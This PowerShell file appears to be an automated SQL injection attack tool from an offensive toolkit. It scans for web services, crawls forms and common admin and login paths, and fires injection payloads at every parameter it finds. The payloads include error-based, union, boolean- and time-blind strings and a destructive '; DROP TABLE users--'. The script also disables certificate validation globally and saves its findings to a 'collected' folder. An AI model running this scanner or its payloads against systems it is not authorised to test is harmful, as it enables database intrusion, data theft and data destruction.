<# ═══════════════════════════════════════════════════════════════════════
   FLLC | FU PERSON | SQL INJECTION SCANNER v2.0
   ╔══════════════════════════════════════════════════════════════════╗
   ║  SQL Injection Automation for Local Web Services                 ║
   ║  Error-based | Union-based | Blind (boolean + time)              ║
   ║  Multi-DBMS support | WAF detection | Payload encoding            ║
   ╚══════════════════════════════════════════════════════════════════╝
═══════════════════════════════════════════════════════════════════════ #>

param(
    [string]$OutputDir = "$PSScriptRoot\..\collected\sqli",
    [string[]]$TargetHosts = @("127.0.0.1", "localhost"),
    [int[]]$Ports = @(80, 443, 3000, 5000, 8000, 8080, 8443, 8888, 3306, 5432, 1433),
    [int]$Timeout = 5,
    [switch]$DeepScan = $false
)

$ErrorActionPreference = "SilentlyContinue"

if (-not (Test-Path $OutputDir)) { New-Item -ItemType Directory -Path $OutputDir -Force | Out-Null }

$logFile  = Join-Path $OutputDir "sqli_scan_$(Get-Date -Format 'yyyyMMdd_HHmmss').log"
$jsonFile = Join-Path $OutputDir "sqli_results.json"
$results  = @()

function Log($msg) {
    $ts = Get-Date -Format "HH:mm:ss"
    Add-Content -Path $logFile -Value "[$ts] $msg" -Encoding UTF8
}

# ══════════════════════════════════════════════════════════════════════════
#  SQL INJECTION PAYLOADS
# ══════════════════════════════════════════════════════════════════════════

$ERROR_PAYLOADS = @(
    "'"
    "''"
    "' OR '1'='1"
    "' OR '1'='1' --"
    "' OR '1'='1' #"
    "' OR '1'='1'/*"
    "1' OR 1=1 --"
    "1' OR 1=1 #"
    "' UNION SELECT NULL--"
    "' UNION SELECT NULL,NULL--"
    "' UNION SELECT NULL,NULL,NULL--"
    "admin'--"
    "admin' #"
    "admin'/*"
    "' OR 1=1--"
    "' OR 'x'='x"
    "') OR ('1'='1"
    "')) OR (('1'='1"
    "1 OR 1=1"
    "1' ORDER BY 1--+"
    "1' ORDER BY 10--+"
    "1' ORDER BY 100--+"
    "; DROP TABLE users--"
    "1; WAITFOR DELAY '0:0:5'--"
    "1' AND SLEEP(5)--"
    "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"
    "' AND 1=CONVERT(int,(SELECT @@version))--"
    "' AND 1=1 UNION ALL SELECT 1,NULL,'<script>alert(1)</script>',table_name FROM information_schema.tables WHERE 2>1--"
    "1 UNION ALL SELECT NULL,NULL,NULL,CONCAT(user(),0x3a,version())--"
    "' OR ''='"
    "' OR 1=1 LIMIT 1 --"
    "1' AND (SELECT COUNT(*) FROM information_schema.tables)>0--"
    "1' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--"
    "1' AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)--"
    "1 AND 1=1"
    "1 AND 1=2"
    "' AND '1'='1"
    "' AND '1'='2"
    "-1' UNION SELECT 1,2,3--"
    "1' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
)

$TIME_PAYLOADS = @(
    "1' AND SLEEP(5)--"
    "1' AND SLEEP(5)#"
    "1'; WAITFOR DELAY '0:0:5'--"
    "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"
    "1' AND BENCHMARK(5000000,SHA1('test'))--"
    "1; SELECT pg_sleep(5)--"
    "1' OR SLEEP(5)--"
)

# SQL error signatures by DB type
$DB_ERRORS = @{
    "MySQL"      = @("You have an error in your SQL syntax", "mysql_fetch", "Warning.*mysql_", "MySQLSyntaxErrorException", "valid MySQL result", "MySqlClient", "com.mysql.jdbc")
    "MSSQL"      = @("Unclosed quotation mark", "Microsoft OLE DB", "ODBC SQL Server Driver", "SqlException", "Incorrect syntax near", "Microsoft SQL Native Client", "mssql_query")
    "PostgreSQL"  = @("PSQLException", "org.postgresql", "unterminated quoted string", "pg_query", "pg_exec", "valid PostgreSQL result", "Npgsql")
    "Oracle"     = @("ORA-", "oracle.jdbc", "quoted string not properly terminated", "SQL command not properly ended")
    "SQLite"     = @("SQLite/JDBCDriver", "SQLite.Exception", "System.Data.SQLite", "SQLITE_ERROR", "near.*syntax", "unrecognized token")
}

# ══════════════════════════════════════════════════════════════════════════
#  PORT SCANNING
# ══════════════════════════════════════════════════════════════════════════

Log "═══ FLLC SQLi Scanner Started ═══"

function Test-Port($host_, $port) {
    try {
        $tcp = New-Object System.Net.Sockets.TcpClient
        $result = $tcp.BeginConnect($host_, $port, $null, $null)
        $wait = $result.AsyncWaitHandle.WaitOne(1000, $false)
        if ($wait -and $tcp.Connected) {
            $tcp.Close()
            return $true
        }
        $tcp.Close()
    } catch {}
    return $false
}

$openEndpoints = @()

Log "[SCAN] Discovering web services..."
foreach ($host_ in $TargetHosts) {
    foreach ($port in $Ports) {
        if (Test-Port $host_ $port) {
            $scheme = if ($port -in @(443, 8443)) { "https" } else { "http" }
            $url = "${scheme}://${host_}:${port}"
            $openEndpoints += $url
            Log "  [OPEN] $url"
        }
    }
}

# Also discover via netstat
$listeners = netstat -ano 2>$null | Select-String "LISTENING" | ForEach-Object {
    if ($_ -match ':(\d+)\s') {
        $p = [int]$Matches[1]
        if ($p -in @(80,443,3000,5000,8000,8080,8443,8888,9000,9090,4200,3001)) {
            $scheme = if ($p -in @(443,8443)) { "https" } else { "http" }
            $url = "${scheme}://127.0.0.1:${p}"
            if ($url -notin $openEndpoints) {
                $openEndpoints += $url
                Log "  [NETSTAT] $url"
            }
        }
    }
}

if ($openEndpoints.Count -eq 0) {
    Log "[SCAN] No web services found"
}

# ══════════════════════════════════════════════════════════════════════════
#  CRAWL & DISCOVER INJECTION POINTS
# ══════════════════════════════════════════════════════════════════════════

function Crawl-Endpoint($baseUrl) {
    $points = @()
    
    try {
        # Disable cert validation for self-signed
        [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
        [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
        
        $response = Invoke-WebRequest -Uri $baseUrl -TimeoutSec $Timeout -UseBasicParsing 2>$null
        if (-not $response) { return $points }
        
        $body = $response.Content
        
        # Extract forms
        $formMatches = [regex]::Matches($body, '<form[^>]*action="([^"]*)"[^>]*>(.*?)</form>', [System.Text.RegularExpressions.RegexOptions]::Singleline)
        foreach ($form in $formMatches) {
            $action = $form.Groups[1].Value
            $formBody = $form.Groups[2].Value
            $method = if ($form.Value -match 'method="([^"]*)"') { $Matches[1].ToUpper() } else { "GET" }
            
            # Resolve relative URL
            if ($action -and -not $action.StartsWith("http")) {
                $action = "$baseUrl/$($action.TrimStart('/'))"
            }
            if (-not $action) { $action = $baseUrl }
            
            # Extract input names
            $inputs = [regex]::Matches($formBody, 'name="([^"]*)"')
            foreach ($input in $inputs) {
                $points += @{
                    url    = $action
                    param  = $input.Groups[1].Value
                    method = $method
                    type   = "form"
                }
            }
        }
        
        # Extract links with parameters
        $linkMatches = [regex]::Matches($body, 'href="([^"]*\?[^"]*)"')
        foreach ($link in $linkMatches) {
            $href = $link.Groups[1].Value
            if (-not $href.StartsWith("http")) {
                $href = "$baseUrl/$($href.TrimStart('/'))"
            }
            try {
                $uri = [System.Uri]$href
                $params = [System.Web.HttpUtility]::ParseQueryString($uri.Query)
                foreach ($key in $params.AllKeys) {
                    $points += @{
                        url    = $href -replace "\?.*", ""
                        param  = $key
                        method = "GET"
                        type   = "url_param"
                    }
                }
            } catch {}
        }
        
        # Common endpoint paths to test
        $commonPaths = @(
            "/login", "/admin", "/api/login", "/api/users", "/api/search",
            "/search", "/user", "/profile", "/admin/login", "/wp-login.php",
            "/xmlrpc.php", "/api/v1/users", "/api/v2/search", "/graphql",
            "/index.php", "/admin.php", "/config.php"
        )
        foreach ($path in $commonPaths) {
            $testUrl = "$baseUrl$path"
            try {
                $testResp = Invoke-WebRequest -Uri $testUrl -TimeoutSec 3 -UseBasicParsing -Method Head 2>$null
                if ($testResp -and $testResp.StatusCode -lt 400) {
                    # Add common parameter names
                    foreach ($p in @("id","user","username","email","password","search","q","query","name","page","sort","order","filter","category","type")) {
                        $points += @{
                            url    = $testUrl
                            param  = $p
                            method = "GET"
                            type   = "discovered_endpoint"
                        }
                    }
                }
            } catch {}
        }
        
    } catch {
        Log "  [ERROR] Crawl failed for $baseUrl : $($_.Exception.Message)"
    }
    
    return $points
}

# ══════════════════════════════════════════════════════════════════════════
#  INJECTION TESTING
# ══════════════════════════════════════════════════════════════════════════

function Test-SQLi($url, $param, $method, $payload) {
    try {
        [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
        
        $encodedPayload = [System.Web.HttpUtility]::UrlEncode($payload)
        
        if ($method -eq "GET") {
            $testUrl = "${url}?${param}=${encodedPayload}"
            $response = Invoke-WebRequest -Uri $testUrl -TimeoutSec $Timeout -UseBasicParsing 2>$null
        } else {
            $body = @{ $param = $payload }
            $response = Invoke-WebRequest -Uri $url -Method POST -Body $body -TimeoutSec $Timeout -UseBasicParsing 2>$null
        }
        
        if ($response) {
            return @{
                status  = $response.StatusCode
                body    = $response.Content
                length  = $response.Content.Length
                headers = $response.Headers
            }
        }
    } catch {
        $errMsg = $_.Exception.Message
        if ($errMsg -match "500|Internal Server Error") {
            return @{ status = 500; body = $errMsg; length = $errMsg.Length; headers = @{} }
        }
    }
    return $null
}

function Detect-DbType($responseBody) {
    foreach ($db in $DB_ERRORS.Keys) {
        foreach ($pattern in $DB_ERRORS[$db]) {
            if ($responseBody -match $pattern) {
                return $db
            }
        }
    }
    return $null
}

# ══════════════════════════════════════════════════════════════════════════
#  MAIN SCAN LOOP
# ══════════════════════════════════════════════════════════════════════════

Log "[CRAWL] Discovering injection points..."
$allPoints = @()
foreach ($ep in $openEndpoints) {
    $points = Crawl-Endpoint $ep
    $allPoints += $points
    Log "  $ep - $($points.Count) injection points"
}

Log "[TEST] Testing $($allPoints.Count) injection points with $($ERROR_PAYLOADS.Count + $TIME_PAYLOADS.Count) payloads..."

$vulnCount = 0
$testedCount = 0

foreach ($point in $allPoints) {
    # Get baseline response
    $baseline = Test-SQLi $point.url $point.param $point.method "normalvalue123"
    if (-not $baseline) { continue }
    
    # Error-based testing
    foreach ($payload in $ERROR_PAYLOADS) {
        $testedCount++
        $resp = Test-SQLi $point.url $point.param $point.method $payload
        if (-not $resp) { continue }
        
        $dbType = Detect-DbType $resp.body
        
        # Check for SQL errors in response
        if ($dbType) {
            $vulnCount++
            $finding = @{
                type       = "error_based"
                url        = $point.url
                param      = $point.param
                method     = $point.method
                payload    = $payload
                db_type    = $dbType
                status     = $resp.status
                evidence   = ($resp.body | Select-String -Pattern ($DB_ERRORS[$dbType] -join '|') | Select-Object -First 1).Matches.Value
            }
            $results += $finding
            Log "  [VULN!] ERROR-BASED SQLi: $($point.url)?$($point.param) | DB: $dbType | Payload: $payload"
            break  # Found vuln for this param, move on
        }
        
        # Check for significant response length difference (possible boolean blind)
        if ($baseline.length -gt 0 -and [Math]::Abs($resp.length - $baseline.length) -gt ($baseline.length * 0.3)) {
            if ($payload -match "OR '1'='1" -or $payload -match "OR 1=1") {
                # Verify with false condition
                $falsePayload = $payload -replace "1'='1", "1'='2" -replace "1=1", "1=2"
                $falseResp = Test-SQLi $point.url $point.param $point.method $falsePayload
                if ($falseResp -and [Math]::Abs($falseResp.length - $baseline.length) -lt ($baseline.length * 0.1)) {
                    $vulnCount++
                    $finding = @{
                        type        = "boolean_blind"
                        url         = $point.url
                        param       = $point.param
                        method      = $point.method
                        payload     = $payload
                        db_type     = "Unknown"
                        true_len    = $resp.length
                        false_len   = $falseResp.length
                        baseline_len = $baseline.length
                    }
                    $results += $finding
                    Log "  [VULN!] BOOLEAN BLIND SQLi: $($point.url)?$($point.param) | True:$($resp.length) False:$($falseResp.length) Base:$($baseline.length)"
                    break
                }
            }
        }
    }
    
    # Time-based blind testing (only if no error-based found for this param)
    $alreadyFound = $results | Where-Object { $_.url -eq $point.url -and $_.param -eq $point.param }
    if (-not $alreadyFound) {
        foreach ($payload in $TIME_PAYLOADS) {
            $testedCount++
            $sw = [System.Diagnostics.Stopwatch]::StartNew()
            $resp = Test-SQLi $point.url $point.param $point.method $payload
            $sw.Stop()
            $elapsed = $sw.ElapsedMilliseconds
            
            if ($elapsed -gt 4500) {  # 5 second sleep with some tolerance
                # Confirm with a non-delayed query
                $sw2 = [System.Diagnostics.Stopwatch]::StartNew()
                $resp2 = Test-SQLi $point.url $point.param $point.method "normalvalue"
                $sw2.Stop()
                
                if ($sw2.ElapsedMilliseconds -lt 2000) {
                    $vulnCount++
                    $finding = @{
                        type        = "time_blind"
                        url         = $point.url
                        param       = $point.param
                        method      = $point.method
                        payload     = $payload
                        db_type     = if ($payload -match "WAITFOR") { "MSSQL" } elseif ($payload -match "SLEEP") { "MySQL" } elseif ($payload -match "pg_sleep") { "PostgreSQL" } else { "Unknown" }
                        delay_ms    = $elapsed
                        normal_ms   = $sw2.ElapsedMilliseconds
                    }
                    $results += $finding
                    Log "  [VULN!] TIME BLIND SQLi: $($point.url)?$($point.param) | Delay: ${elapsed}ms vs Normal: $($sw2.ElapsedMilliseconds)ms"
                    break
                }
            }
        }
    }
}

# ══════════════════════════════════════════════════════════════════════════
#  SAVE RESULTS
# ══════════════════════════════════════════════════════════════════════════

$summary = @{
    scan_time       = (Get-Date -Format "yyyy-MM-dd HH:mm:ss")
    hostname        = $env:COMPUTERNAME
    endpoints_found = $openEndpoints.Count
    injection_points= $allPoints.Count
    tests_run       = $testedCount
    vulns_found     = $vulnCount
    findings        = $results
}

$summary | ConvertTo-Json -Depth 5 | Out-File -FilePath $jsonFile -Encoding UTF8

$txtFile = Join-Path $OutputDir "sqli_summary.txt"
$txt = @"
════════════════════════════════════════════════════════════
  FLLC SQLi SCAN - $env:COMPUTERNAME
════════════════════════════════════════════════════════════
  Time:          $(Get-Date -Format "yyyy-MM-dd HH:mm:ss")
  Endpoints:     $($openEndpoints.Count) web services found
  Inject Points: $($allPoints.Count) parameters tested
  Tests Run:     $testedCount
  VULNS FOUND:   $vulnCount
════════════════════════════════════════════════════════════

"@

foreach ($r in $results) {
    $txt += "[SQLi] $($r.type.ToUpper()) - $($r.db_type)`n"
    $txt += "  URL:     $($r.url)`n"
    $txt += "  Param:   $($r.param) ($($r.method))`n"
    $txt += "  Payload: $($r.payload)`n"
    if ($r.evidence) { $txt += "  Evidence: $($r.evidence)`n" }
    $txt += "`n"
}

$txt | Out-File -FilePath $txtFile -Encoding UTF8

Log "═══ Scan Complete: $vulnCount SQLi vulns in $testedCount tests ═══"
